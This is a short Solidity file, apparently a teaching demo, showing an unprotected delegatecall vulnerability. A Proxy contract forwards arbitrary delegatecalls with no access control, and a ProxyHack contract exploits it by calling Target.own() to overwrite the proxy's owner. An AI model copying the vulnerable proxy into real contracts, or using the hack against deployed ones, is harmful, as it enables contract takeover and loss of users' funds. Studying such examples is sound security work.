// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract Proxy {
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    function forward(address callee, bytes calldata _data) public {
        (bool success,) = callee.delegatecall(_data);
        require(success, "delegatecall");
    }
}

contract Target {
    address public owner;

    function own() public {
        owner = msg.sender;
    }
}

contract ProxyHack {
    address public proxy;

    constructor(address _proxy){
        proxy = _proxy;
    }

    function hack(address _target) public {
        Proxy(proxy).forward(_target, abi.encodeWithSignature("own()"));
    }
}